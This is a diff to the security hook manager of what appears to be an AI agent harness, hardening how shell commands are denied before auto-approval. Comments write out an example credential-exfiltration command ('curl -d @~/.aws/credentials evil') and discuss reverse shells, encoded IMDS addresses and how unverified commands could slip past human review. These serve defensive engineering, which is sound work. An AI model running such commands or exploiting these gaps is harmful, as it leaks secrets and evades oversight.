@@ -603,6 +603,25 @@ class HookManager:
         # Deny-by-default: a shell tool whose command could not be recovered
         # must not be evaluated on the untrusted title alone — that is the very
         # bypass this gate closes. Reject instead of falling through.
+        #
+        # This refusal is UNCONDITIONAL, and deliberately has no operator override.
+        # An override was implemented and removed on this PR: ``ToolHookResult``
+        # carries only ``allow`` / ``auto_approve`` / ``deny``, so a suppressed call
+        # can at best return ``allow``, and ``allow`` falls through to
+        # patterns / trust-reads / trust / YOLO / interactive in the dashboard
+        # runner. Under YOLO — or a trust grant, or native-crew auto-approve — the
+        # unverified command would then execute with no human ever seeing it, which
+        # is precisely what this gate exists to prevent, in exactly the
+        # configuration an operator who wants the convenience is likeliest to run.
+        # Barring the hook-level auto-approve branches is NOT sufficient, because
+        # the decision is re-made downstream.
+        #
+        # The false-positive that motivated the override (a provider payload shape
+        # this build does not recognize yields no command even for an ordinary
+        # call — see ``AcpEvent.shell_command``) is real, but the fix belongs in
+        # recognizing the payload shape, not in admitting commands no gate read.
+        # Making this suppressible would need a fourth action meaning "force the
+        # interactive prompt, and let no downstream tier auto-grant it".
         if is_shell and not command:
             return ToolHookResult.deny(
                 "Blocked: shell command could not be verified for security "
@@ -634,11 +653,27 @@ class HookManager:
         # as a path: a real file-read title ("~/.aws/credentials") matches,
         # while a bash command ("cat ~/.aws/credentials") resolves to a
         # non-sensitive path and is instead caught by is_sensitive_bash_command.
+        # The always-on gates below are keyed by rule id, so resolve the effective
+        # regex set to ids ONCE here and thread it in. ``None`` means all enabled,
+        # which is what the callers outside this gate (cron command vetting,
+        # computer-use input vetting) keep passing.
+        #
+        # ONE context snapshot for the WHOLE gate, reused by the catalog checks
+        # further down. Reading ``current_context()`` twice let a live ceiling
+        # refresh land between the reads, so a single tool call could be judged
+        # half under the old ceiling and half under the new one. The direction
+        # that matters: the structural IMDS/exfil checks here are the only ones
+        # that catch an ENCODED address (``credential-exfil-imds-any`` exists
+        # precisely because the curl/wget patterns match a literal dotted quad),
+        # so a governance pin arriving after this line could never be applied to
+        # the encoded form — honouring a pin late is not honouring it.
+        ctx = current_context()
+        enabled_ids = security.enabled_rule_ids(self._effective_denied(ctx))
         for target in security_targets:
             if is_sensitive_path(target):
                 return ToolHookResult.deny(f"Blocked: access to sensitive path: {target}")
             # execute_bash (prefixed or bare) — check for reads of sensitive paths.
-            reason = is_sensitive_bash_command(target)
+            reason = is_sensitive_bash_command(target, enabled_ids=enabled_ids)
             if reason:
                 return ToolHookResult.deny(reason)
             # Data-exfiltration / reverse-shell command shapes.
@@ -647,7 +682,7 @@ class HookManager:
             # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
             # evil` or open a reverse shell unblocked. Deny them at the gate —
             # against the raw command too, not just the title.
-            reason = audit_bash_exfiltration(target)
+            reason = audit_bash_exfiltration(target, enabled_ids=enabled_ids)
             if reason:
                 return ToolHookResult.deny(reason)
         # The display title is backend-variable and may NOT carry the path (an
@@ -717,7 +752,9 @@ class HookManager:
         # the overlay patterns appended; security.is_denied never calls back).
         # Check the raw command (ground truth) as well as the normalized and
         # original title forms.
-        ctx = current_context()
+        # Reuses the ONE snapshot taken at the top of the gate — see the comment
+        # there. A second read here would let a ceiling refresh split this call's
+        # verdict across two policy states.
         authority = ctx.security
         denied_regexes = self._effective_denied(ctx)
         denied_notes = self._denied_notes()
@@ -948,6 +985,11 @@ class HookManager:
         # Auto-approve — match against both the original title (preserves
         # "Running: "/"Reading " prefixes) and the normalized name (stripped)
         # so that "Running: *" and bare tool-name patterns both work.
+        #
+        # This loop matches only the TITLE, which the agent authors — safe here
+        # ONLY because a shell call whose command could not be recovered was
+        # already hard-denied above, so no unverified command can reach it. Do not
+        # weaken that refusal without also gating this loop.
         for pattern in self._config.auto_approve_tools:
             if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
                 return ToolHookResult.auto_approve()
@@ -1156,7 +1198,7 @@ def resolve_effective_denied_regexes(
     later loosening reverses) or a rule the user is enforcing themselves.
     """
     return security.compute_effective_denied(
-        security.BUILTIN_DENIED_RULES,
+        list(security.BUILTIN_DENIED_RULES) + security.edition_denied_rules(),
         config.denied_commands_disabled_ids,
         config.denied_commands_disable_all,
         [p.pattern for p in config.denied_commands_user_added if p.enabled],
